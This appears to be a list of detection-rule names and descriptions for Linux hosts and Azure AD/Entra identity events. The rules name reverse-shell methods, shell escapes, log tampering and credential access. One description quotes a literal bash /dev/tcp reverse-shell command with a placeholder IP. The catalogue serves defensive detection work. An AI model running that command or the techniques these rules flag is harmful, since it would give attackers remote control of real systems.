rules.name: Named Pipe Created Via Mkfifo
rules.description: Detects the creation of a new named pipe using the "mkfifo" utility

rules.name: Curl Usage on Linux
rules.description: Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server

rules.name: Potential Perl Reverse Shell Execution
rules.description: Detects execution of the perl binary with the "-e" flag and common strings related to potential reverse shell activity

rules.name: Scheduled Task/Job At
rules.description:
Detects the use of at/atd which are utilities that are used to schedule tasks.
They are often abused by adversaries to maintain persistence or to perform task scheduling for initial or recurring execution of malicious code

rules.name: Shell Invocation via Env Command - Linux
rules.description: Detects the use of the env command to invoke a shell. This may indicate an attempt to bypass restricted environments, escalate privileges, or execute arbitrary commands.

rules.name: Potential GobRAT File Discovery Via Grep
rules.description: Detects the use of grep to discover specific files created by the GobRAT malware

rules.name: Suspicious Java Children Processes
rules.description: Detects java process spawning suspicious children

rules.name: Shell Execution via Find - Linux
rules.description: Detects the use of the find command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or exploitation attempt.

rules.name: Disabling Security Tools
rules.description: Detects disabling security tools

rules.name: Local Groups Discovery - Linux
rules.description: Detects enumeration of local system groups. Adversaries may attempt to find local system groups and permission settings

rules.name: System Network Connections Discovery - Linux
rules.description: Detects usage of system utilities to discover system network connections

rules.name: Remove Scheduled Cron Task/Job
rules.description:
Detects usage of the 'crontab' utility to remove the current crontab.
This is a common occurrence where cryptocurrency miners compete against each other by removing traces of other miners to hijack the maximum amount of resources possible

rules.name: Pnscan Binary Data Transmission Activity
rules.description:
Detects command line patterns associated with the use of Pnscan for sending and receiving binary data across the network.
This behavior has been identified in a Linux malware campaign targeting Docker, Apache Hadoop, Redis, and Confluence and was previously used by the threat actor known as TeamTNT

rules.name: Crontab Enumeration
rules.description: Detects usage of crontab to list the tasks of the user

rules.name: Potentially Suspicious Execution From Tmp Folder
rules.description: Detects a potentially suspicious execution of a process located in the '/tmp/' folder

rules.name: Linux Doas Tool Execution
rules.description: Detects the doas tool execution in linux host platform. This utility tool allow standard users to perform tasks as root, the same way sudo does.

rules.name: Shell Invocation via Apt - Linux
rules.description:
Detects the use of the "apt" and "apt-get" commands to execute a shell or proxy commands.
Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.name: Install Root Certificate
rules.description: Detects installation of new certificate on the system which attackers may use to avoid warnings when connecting to controlled web servers or C2s

rules.name: Disable Or Stop Services
rules.description: Detects the usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services

rules.name: Linux HackTool Execution
rules.description: Detects known hacktool execution based on image name.

rules.name: Potential Netcat Reverse Shell Execution
rules.description: Detects execution of netcat with the "-e" flag followed by common shells. This could be a sign of a potential reverse shell setup.

rules.name: Linux Base64 Encoded Shebang In CLI
rules.description: Detects the presence of a base64 version of the shebang in the commandline, which could indicate a malicious payload about to be decoded

rules.name: File and Directory Discovery - Linux
rules.description: Detects usage of system utilities such as "find", "tree", "findmnt", etc, to discover files, directories and network shares.

rules.name: Remote Access Tool - Team Viewer Session Started On Linux Host
rules.description:
Detects the command line executed when TeamViewer starts a session started by a remote host.
Once a connection has been started, an investigator can verify the connection details by viewing the "incoming_connections.txt" log file in the TeamViewer folder.

rules.name: Suspicious Invocation of Shell via AWK - Linux
rules.description:
Detects the execution of "awk" or it's sibling commands, to invoke a shell using the system() function.
This behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.

rules.name: Python Spawning Pretty TTY Via PTY Module
rules.description: Detects a python process calling to the PTY module in order to spawn a pretty tty which could be indicative of potential reverse shell activity.

rules.name: ESXi Admin Permission Assigned To Account Via ESXCLI
rules.description: Detects execution of the "esxcli" command with the "system" and "permission" flags in order to assign admin permissions to an account.

rules.name: Potential Suspicious Change To Sensitive/Critical Files
rules.description: Detects changes of sensitive and critical files. Monitors files that you don't expect to change without planning on Linux system.

rules.name: Suspicious Curl Change User Agents - Linux
rules.description: Detects a suspicious curl process start on linux with set useragent options

rules.name: Commands to Clear or Remove the Syslog
rules.description: Detects specific commands commonly used to remove or empty the syslog. Which is often used by attacker as a method to hide their tracks

rules.name: Security Software Discovery - Linux
rules.description: Detects usage of system utilities (only grep and egrep for now) to discover security software discovery

rules.name: Download File To Potentially Suspicious Directory Via Wget
rules.description: Detects the use of wget to download content to a suspicious directory

rules.name: Python Reverse Shell Execution Via PTY And Socket Modules
rules.description: Detects the execution of python with calls to the socket and pty module in order to connect and spawn a potential reverse shell.

rules.name: Copy Passwd Or Shadow From TMP Path
rules.description: Detects when the file "passwd" or "shadow" is copied from tmp path

rules.name: Clear Linux Logs
rules.description: Detects attempts to clear logs on the system. Adversaries may clear system logs to hide evidence of an intrusion

rules.name: File Deletion
rules.description: Detects file deletion using "rm", "shred" or "unlink" commands which are used often by adversaries to delete files left behind by the actions of their intrusion activity

rules.name: Linux Network Service Scanning Tools Execution
rules.description: Detects execution of network scanning and reconnaisance tools. These tools can be used for the enumeration of local or remote network services for example.

rules.name: Capsh Shell Invocation - Linux
rules.description: Detects the use of the "capsh" utility to invoke a shell.

rules.name: Potential Container Discovery Via Inodes Listing
rules.description: Detects listing of the inodes of the "/" directory to determine if the we are running inside of a container.

rules.name: Docker Container Discovery Via Dockerenv Listing
rules.description: Detects listing or file reading of ".dockerenv" which can be a sing of potential container discovery

rules.name: Suspicious Git Clone - Linux
rules.description: Detects execution of "git" in order to clone a remote repository that contain suspicious keywords which might be suspicious

rules.name: Enable BPF Kprobes Tracing
rules.description: Detects common command used to enable bpf kprobes tracing

rules.name: Bash Interactive Shell
rules.description: Detects execution of the bash shell with the interactive flag "-i".

rules.name: OS Architecture Discovery Via Grep
rules.description: Detects the use of grep to identify information about the operating system architecture. Often combined beforehand with the execution of "uname" or "cat /proc/cpuinfo"

rules.name: Execution Of Script Located In Potentially Suspicious Directory
rules.description: Detects executions of scripts located in potentially suspicious locations such as "/tmp" via a shell such as "bash", "sh", etc.

rules.name: User Has Been Deleted Via Userdel
rules.description: Detects execution of the "userdel" binary. Which is used to delete a user account and related files. This is sometimes abused by threat actors in order to cover their tracks

rules.name: Shell Invocation Via Ssh - Linux
rules.description: Detects the use of the "ssh" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.name: Atlassian Confluence CVE-2022-26134
rules.description: Detects spawning of suspicious child processes by Atlassian Confluence server which may indicate successful exploitation of CVE-2022-26134

rules.name: Shell Execution GCC  - Linux
rules.description: Detects the use of the "gcc" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.name: Linux Base64 Encoded Pipe to Shell
rules.description: Detects suspicious process command line that uses base64 encoded input for execution with a shell

rules.name: Linux Webshell Indicators
rules.description: Detects suspicious sub processes of web server processes

rules.name: OMIGOD SCX RunAsProvider ExecuteShellCommand
rules.description:
Rule to detect the use of the SCX RunAsProvider Invoke_ExecuteShellCommand to execute any UNIX/Linux command using the /bin/sh shell.
SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including
Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.

rules.name: Suspicious Nohup Execution
rules.description: Detects execution of binaries located in potentially suspicious locations via "nohup"

rules.name: Potential PHP Reverse Shell
rules.description:
Detects usage of the PHP CLI with the "-r" flag which allows it to run inline PHP code. The rule looks for calls to the "fsockopen" function which allows the creation of sockets.
Attackers often leverage this in combination with functions such as "exec" or "fopen" to initiate a reverse shell connection.

rules.name: Suspicious Curl File Upload - Linux
rules.description: Detects a suspicious curl process start the adds a file to a web request

rules.name: ESXi System Information Discovery Via ESXCLI
rules.description: Detects execution of the "esxcli" command with the "system" flag in order to retrieve information about the different component of the system. Such as accounts, modules, NTP, etc.

rules.name: Nohup Execution
rules.description: Detects usage of nohup which could be leveraged by an attacker to keep a process running or break out from restricted environments

rules.name: Potentially Suspicious Named Pipe Created Via Mkfifo
rules.description: Detects the creation of a new named pipe using the "mkfifo" utility in a potentially suspicious location

rules.name: Potential Discovery Activity Using Find - Linux
rules.description: Detects usage of "find" binary in a suspicious manner to perform discovery

rules.name: Potential Ruby Reverse Shell
rules.description: Detects execution of ruby with the "-e" flag and calls to "socket" related functions. This could be an indication of a potential attempt to setup a reverse shell

rules.name: Inline Python Execution - Spawn Shell Via OS System Library
rules.description: Detects execution of inline Python code via the "-c" in order to call the "system" function from the "os" library, and spawn a shell.

rules.name: Scheduled Cron Task/Job - Linux
rules.description: Detects abuse of the cron utility to perform task scheduling for initial or recurring execution of malicious code. Detection will focus on crontab jobs uploaded from the tmp folder.

rules.name: Shell Execution via Git - Linux
rules.description: Detects the use of the "git" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.name: Flush Iptables Ufw Chain
rules.description: Detect use of iptables to flush all firewall rules, tables and chains and allow all network traffic

rules.name: Cat Sudoers
rules.description: Detects the execution of a cat /etc/sudoers to list all users that have sudo rights

rules.name: User Added To Root/Sudoers Group Using Usermod
rules.description: Detects usage of the "usermod" binary to add users add users to the root or suoders groups

rules.name: System Network Discovery - Linux
rules.description: Detects enumeration of local network configuration

rules.name: ESXi Network Configuration Discovery Via ESXCLI
rules.description: Detects execution of the "esxcli" command with the "network" flag in order to retrieve information about the network configuration.

rules.name: Mount Execution With Hidepid Parameter
rules.description: Detects execution of the "mount" command with "hidepid" parameter to make invisible processes to other users from the system

rules.name: Touch Suspicious Service File
rules.description: Detects usage of the "touch" process in service file.

rules.name: Setuid and Setgid
rules.description: Detects suspicious change of file privileges with chown and chmod commands

rules.name: Shell Execution via Rsync - Linux
rules.description: Detects the use of the "rsync" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.name: Remove Immutable File Attribute
rules.description: Detects usage of the 'chattr' utility to remove immutable file attribute.

rules.name: ESXi VM List Discovery Via ESXCLI
rules.description: Detects execution of the "esxcli" command with the "vm" flag in order to retrieve information about the installed VMs.

rules.name: DD File Overwrite
rules.description: Detects potential overwriting and deletion of a file using DD.

rules.name: History File Deletion
rules.description: Detects events in which a history file gets deleted, e.g. the ~/bash_history to remove traces of malicious activity

rules.name: Capabilities Discovery - Linux
rules.description: Detects usage of "getcap" binary. This is often used during recon activity to determine potential binaries that can be abused as GTFOBins or other.

rules.name: ESXi VM Kill Via ESXCLI
rules.description: Detects execution of the "esxcli" command with the "vm" and "kill" flag in order to kill/shutdown a specific VM.

rules.name: Container Residence Discovery Via Proc Virtual FS
rules.description: Detects potential container discovery via listing of certain kernel features in the "/proc" virtual filesystem

rules.name: Potential Xterm Reverse Shell
rules.description: Detects usage of "xterm" as a potential reverse shell tunnel

rules.name: Linux Recon Indicators
rules.description: Detects events with patterns found in commands used for reconnaissance on linux systems

rules.name: Linux Remote System Discovery
rules.description: Detects the enumeration of other remote systems.

rules.name: Local System Accounts Discovery - Linux
rules.description: Detects enumeration of local systeam accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.

rules.name: Linux Package Uninstall
rules.description: Detects linux package removal using builtin tools such as "yum", "apt", "apt-get" or "dpkg".

rules.name: Shell Execution Of Process Located In Tmp Directory
rules.description: Detects execution of shells from a parent process located in a temporary (/tmp) directory

rules.name: Shell Execution via Nice - Linux
rules.description: Detects the use of the "nice" utility to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.name: Linux Shell Pipe to Shell
rules.description: Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell

rules.name: Linux Crypto Mining Indicators
rules.description: Detects command line parameters or strings often used by crypto miners

rules.name: OMIGOD SCX RunAsProvider ExecuteScript
rules.description:
Rule to detect the use of the SCX RunAsProvider ExecuteScript to execute any UNIX/Linux script using the /bin/sh shell.
Script being executed gets created as a temp file in /tmp folder with a scx* prefix.
Then it is invoked from the following directory /etc/opt/microsoft/scx/conf/tmpdir/.
The file in that directory has the same prefix scx*. SCXcore, started as the Microsoft Operations Manager UNIX/Linux Agent, is now used in a host of products including
Microsoft Operations Manager, Microsoft Azure, and Microsoft Operations Management Suite.

rules.name: Suspicious Package Installed - Linux
rules.description: Detects installation of suspicious packages using system installation utilities

rules.name: Decode Base64 Encoded Text
rules.description: Detects usage of base64 utility to decode arbitrary base64-encoded text

rules.name: Sudo Privilege Escalation CVE-2019-14287
rules.description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287

rules.name: Connection Proxy
rules.description: Detects setting proxy configuration

rules.name: Clipboard Collection with Xclip Tool
rules.description:
Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed.
Highly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.

rules.name: Suspicious Invocation of Shell via Rsync
rules.description: Detects the execution of a shell as sub process of "rsync" without the expected command line flag "-e" being used, which could be an indication of exploitation as described in CVE-2024-12084. This behavior is commonly associated with attempts to execute arbitrary commands or escalate privileges, potentially leading to unauthorized access or further exploitation.

rules.name: Group Has Been Deleted Via Groupdel
rules.description: Detects execution of the "groupdel" binary. Which is used to delete a group. This is sometimes abused by threat actors in order to cover their tracks

rules.name: ESXi Account Creation Via ESXCLI
rules.description: Detects user account creation on ESXi system via esxcli

rules.name: Apache Spark Shell Command Injection - ProcessCreation
rules.description: Detects attempts to exploit an apache spark server via CVE-2014-6287 from a commandline perspective

rules.name: ESXi VSAN Information Discovery Via ESXCLI
rules.description: Detects execution of the "esxcli" command with the "vsan" flag in order to retrieve information about virtual storage. Seen used by malware such as DarkSide.

rules.name: Ufw Force Stop Using Ufw-Init
rules.description: Detects attempts to force stop the ufw using ufw-init

rules.name: Chmod Suspicious Directory
rules.description: Detects chmod targeting files in abnormal directory paths.

rules.name: System Information Discovery
rules.description: Detects system information discovery commands

rules.name: Shell Execution via Flock - Linux
rules.description: Detects the use of the "flock" command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.name: Vim GTFOBin Abuse - Linux
rules.description:
Detects the use of "vim" and it's siblings commands to execute a shell or proxy commands.
Such behavior may be associated with privilege escalation, unauthorized command execution, or to break out from restricted environments.

rules.name: Print History File Contents
rules.description: Detects events in which someone prints the contents of history files to the commandline or redirects it to a file for reconnaissance

rules.name: ESXi Syslog Configuration Change Via ESXCLI
rules.description: Detects changes to the ESXi syslog configuration via "esxcli"

rules.name: Potential Linux Process Code Injection Via DD Utility
rules.description: Detects the injection of code by overwriting the memory map of a Linux process using the "dd" Linux command.

rules.name: Interactive Bash Suspicious Children
rules.description: Detects suspicious interactive bash as a parent to rather uncommon child processes

rules.name: Triple Cross eBPF Rootkit Install Commands
rules.description: Detects default install commands of the Triple Cross eBPF rootkit based on the "deployer.sh" script

rules.name: Remote File Copy
rules.description: Detects the use of tools that copy files from or to remote systems

rules.name: Linux Command History Tampering
rules.description:
Detects commands that try to clear or tamper with the Linux command history.
This technique is used by threat actors in order to evade defenses and execute commands without them being recorded in files such as "bash_history" or "zsh_history".

rules.name: Shellshock Expression
rules.description: Detects shellshock expressions in log files

rules.name: Equation Group Indicators
rules.description: Detects suspicious shell commands used in various Equation Group scripts and tools

rules.name: Nimbuspwn Exploitation
rules.description: Detects exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800)

rules.name: Privileged User Has Been Created
rules.description: Detects the addition of a new user to a privileged group such as "root" or "sudo"

rules.name: Buffer Overflow Attempts
rules.description: Detects buffer overflow attempts in Unix system log files

rules.name: Symlink Etc Passwd
rules.description: Detects suspicious command lines that look as if they would create symbolic links to /etc/passwd

rules.name: Suspicious Reverse Shell Command Line
rules.description: Detects suspicious shell commands or program code that may be executed or used in command line to establish a reverse shell

rules.name: Suspicious Use of /dev/tcp
rules.description: Detects suspicious command with /dev/tcp

rules.name: Suspicious Activity in Shell Commands
rules.description: Detects suspicious shell commands used in various exploit codes (see references)

rules.name: Commands to Clear or Remove the Syslog - Builtin
rules.description: Detects specific commands commonly used to remove or empty the syslog

rules.name: Code Injection by ld.so Preload
rules.description: Detects the ld.so preload persistence file. See `man ld.so` for more information.

rules.name: Potential Suspicious BPF Activity - Linux
rules.description: Detects the presence of "bpf_probe_write_user" BPF helper-generated warning messages. Which could be a sign of suspicious eBPF activity on the system.

rules.name: Space After Filename
rules.description: Detects space after filename

rules.name: JexBoss Command Sequence
rules.description: Detects suspicious command sequence that JexBoss

rules.name: Suspicious Log Entries
rules.description: Detects suspicious log entries in Linux log files

rules.name: Suspicious VSFTPD Error Messages
rules.description: Detects suspicious VSFTPD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts

rules.name: Disabling Security Tools - Builtin
rules.description: Detects disabling security tools

rules.name: Suspicious Named Error
rules.description: Detects suspicious DNS error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts

rules.name: PwnKit Local Privilege Escalation
rules.description: Detects potential PwnKit exploitation CVE-2021-4034 in auth logs

rules.name: Suspicious OpenSSH Daemon Error
rules.description: Detects suspicious SSH / SSHD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts

rules.name: SSHD Error Message CVE-2018-15473
rules.description: Detects exploitation attempt using public exploit code for CVE-2018-15473

rules.name: Guacamole Two Users Sharing Session Anomaly
rules.description: Detects suspicious session with two users present

rules.name: Sudo Privilege Escalation CVE-2019-14287 - Builtin
rules.description: Detects users trying to exploit sudo vulnerability reported in CVE-2019-14287

rules.name: Relevant ClamAV Message
rules.description: Detects relevant ClamAV messages

rules.name: Modifying Crontab
rules.description: Detects suspicious modification of crontab file.

rules.name: Communication To LocaltoNet Tunneling Service Initiated - Linux
rules.description:
Detects an executable initiating a network connection to "LocaltoNet" tunneling sub-domains.
LocaltoNet is a reverse proxy that enables localhost services to be exposed to the Internet.
Attackers have been seen to use this service for command-and-control activities to bypass MFA and perimeter controls.

rules.name: Linux Crypto Mining Pool Connections
rules.description: Detects process connections to a Monero crypto mining pool

rules.name: Potentially Suspicious Malware Callback Communication - Linux
rules.description: Detects programs that connect to known malware callback ports based on threat intelligence reports.

rules.name: Linux Reverse Shell Indicator
rules.description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

rules.name: Communication To Ngrok Tunneling Service - Linux
rules.description: Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors

rules.name: Primary Refresh Token Access Attempt
rules.description: Indicates access attempt to the PRT resource which can be used to move laterally into an organization or perform credential theft

rules.name: Sign-In From Malware Infected IP
rules.description: Indicates sign-ins from IP addresses infected with malware that is known to actively communicate with a bot server.

rules.name: Malicious IP Address Sign-In Suspicious
rules.description: Indicates sign-in from a malicious IP address known to be malicious at time of sign-in.

rules.name: Anonymous IP Address
rules.description: Indicates sign-ins from an anonymous IP address, for example, using an anonymous browser or VPN.

rules.name: Suspicious Inbox Forwarding Identity Protection
rules.description: Indicates suspicious rules such as an inbox rule that forwards a copy of all emails to an external address

rules.name: New Country
rules.description: Detects sign-ins from new countries. The detection considers past activity locations to determine new and infrequent locations.

rules.name: Suspicious Browser Activity
rules.description: Indicates anomalous behavior based on suspicious sign-in activity across multiple tenants from different countries in the same browser

rules.name: Malicious IP Address Sign-In Failure Rate
rules.description: Indicates sign-in from a malicious IP address based on high failure rates.

rules.name: Unfamiliar Sign-In Properties
rules.description: Detects sign-in with properties that are unfamiliar to the user. The detection considers past sign-in history to look for anomalous sign-ins.

rules.name: Azure AD Threat Intelligence
rules.description: Indicates user activity that is unusual for the user or consistent with known attack patterns.

rules.name: Anomalous Token
rules.description: Indicates that there are abnormal characteristics in the token such as an unusual token lifetime or a token that is played from an unfamiliar location.

rules.name: SAML Token Issuer Anomaly
rules.description: Indicates the SAML token issuer for the associated SAML token is potentially compromised. The claims included in the token are unusual or match known attacker patterns

rules.name: Impossible Travel
rules.description: Identifies user activities originating from geographically distant locations within a time period shorter than the time it takes to travel from the first location to the second.

rules.name: Atypical Travel
rules.description: Identifies two sign-ins originating from geographically distant locations, where at least one of the locations may also be atypical for the user, given past behavior.

rules.name: Anomalous User Activity
rules.description: Indicates that there are anomalous patterns of behavior like suspicious changes to the directory.

rules.name: Azure AD Account Credential Leaked
rules.description: Indicates that the user's valid credentials have been leaked.

rules.name: Suspicious Inbox Manipulation Rules
rules.description: Detects suspicious rules that delete or move messages or folders are set on a user's inbox.

rules.name: Activity From Anonymous IP Address
rules.description: Identifies that users were active from an IP address that has been identified as an anonymous proxy IP address.

rules.name: Password Spray Activity
rules.description: Indicates that a password spray attack has been successfully performed.

rules.name: Roles Activated Too Frequently
rules.description: Identifies when the same privilege role has multiple activations by the same user.

rules.name: Roles Activation Doesn't Require MFA
rules.description: Identifies when a privilege role can be activated without performing mfa.

rules.name: Stale Accounts In A Privileged Role
rules.description: Identifies when an account hasn't signed in during the past n number of days.

rules.name: Roles Are Not Being Used
rules.description: Identifies when a user has been assigned a privilege role and are not using that role.

rules.name: Too Many Global Admins
rules.description: Identifies an event where there are there are too many accounts assigned the Global Administrator role.

rules.name: Invalid PIM License
rules.description: Identifies when an organization doesn't have the proper license for PIM and is out of compliance.

rules.name: Roles Assigned Outside PIM
rules.description: Identifies when a privilege role assignment has taken place outside of PIM and may indicate an attack.

rules.name: Password Reset By User Account
rules.description: Detect when a user has reset their password in Azure AD

rules.name: Changes To PIM Settings
rules.description: Detects when changes are made to PIM roles

rules.name: CA Policy Updated by Non Approved Actor
rules.description: Monitor and alert on conditional access changes. Is Initiated by (actor) approved to make changes? Review Modified Properties and compare "old" vs "new" value.

rules.name: Privileged Account Creation
rules.description: Detects when a new admin is created.

rules.name: End User Consent Blocked
rules.description: Detects when end user consent is blocked due to risk-based consent.

rules.name: Temporary Access Pass Added To An Account
rules.description: Detects when a temporary access pass (TAP) is added to an account. TAPs added to priv accounts should be investigated

rules.name: Account Created And Deleted Within A Close Time Frame
rules.description: Detects when an account was created and deleted in a short period of time.

rules.name: Bulk Deletion Changes To Privileged Account Permissions
rules.description: Detects when a user is removed from a privileged role. Bulk changes should be investigated.

rules.name: Application AppID Uri Configuration Changes
rules.description: Detects when a configuration change is made to an applications AppID URI.

rules.name: User Added To Privilege Role
rules.description: Detects when a user is added to a privileged role.

rules.name: Application URI Configuration Changes
rules.description:
Detects when a configuration change is made to an applications URI.
URIs for domain names that no longer exist (dangling URIs), not using HTTPS, wildcards at the end of the domain, URIs that are no unique to that app, or URIs that point to domains you do not control should be investigated.

rules.name: New CA Policy by Non-approved Actor
rules.description: Monitor and alert on conditional access changes.

rules.name: Multi Factor Authentication Disabled For User Account
rules.description:
Detects changes to the "StrongAuthenticationRequirement" value, where the state is set to "0" or "Disabled".
Threat actors were seen disabling multi factor authentication for users in order to maintain or achieve access to the account. Also see in SIM Swap attacks.

rules.name: User State Changed From Guest To Member
rules.description: Detects the change of user type from "Guest" to "Member" for potential elevation of privilege.

rules.name: App Granted Microsoft Permissions
rules.description: Detects when an application is granted delegated or app role permissions for Microsoft Graph, Exchange, Sharepoint, or Azure AD

rules.name: Added Credentials to Existing Application
rules.description: Detects when a new credential is added to an existing application. Any additional credentials added outside of expected processes could be a malicious actor using those credentials.

rules.name: App Assigned To Azure RBAC/Microsoft Entra Role
rules.description: Detects when an app is assigned Azure AD roles, such as global administrator, or Azure RBAC roles, such as subscription owner.

rules.name: Guest Users Invited To Tenant By Non Approved Inviters
rules.description: Detects guest users being invited to tenant by non-approved inviters

rules.name: End User Consent
rules.description: Detects when an end user consents to an application

rules.name: Change to Authentication Method
rules.description: Change to authentication method could be an indicator of an attacker adding an auth method to the account so they can have continued access.

rules.name: PIM Approvals And Deny Elevation
rules.description: Detects when a PIM elevation is approved or denied. Outside of normal operations should be investigated.

rules.name: Users Added to Global or Device Admin Roles
rules.description: Monitor and alert for users added to device admin roles.

rules.name: Azure Domain Federation Settings Modified
rules.description: Identifies when an user or application modified the federation settings on the domain.

rules.name: App Granted Privileged Delegated Or App Permissions
rules.description: Detects when administrator grants either application permissions (app roles) or highly privileged delegated permissions

rules.name: Added Owner To Application
rules.description: Detects when a new owner is added to an application. This gives that account privileges to make modifications and configuration changes to the application.

rules.name: User Removed From Group With CA Policy Modification Access
rules.description: Monitor and alert on group membership removal of groups that have CA policy modification access

rules.name: Windows LAPS Credential Dump From Entra ID
rules.description: Detects when an account dumps the LAPS password from Entra ID.

rules.name: Azure Subscription Permission Elevation Via AuditLogs
rules.description:
Detects when a user has been elevated to manage all Azure Subscriptions.
This change should be investigated immediately if it isn't planned.
This setting could allow an attacker access to Azure subscriptions in your environment.

rules.name: CA Policy Removed by Non Approved Actor
rules.description: Monitor and alert on conditional access changes where non approved actor removed CA Policy.

rules.name: Guest User Invited By Non Approved Inviters
rules.description: Detects when a user that doesn't have permissions to invite a guest user attempts to invite one.

rules.name: Bitlocker Key Retrieval
rules.description: Monitor and alert for Bitlocker key retrieval.
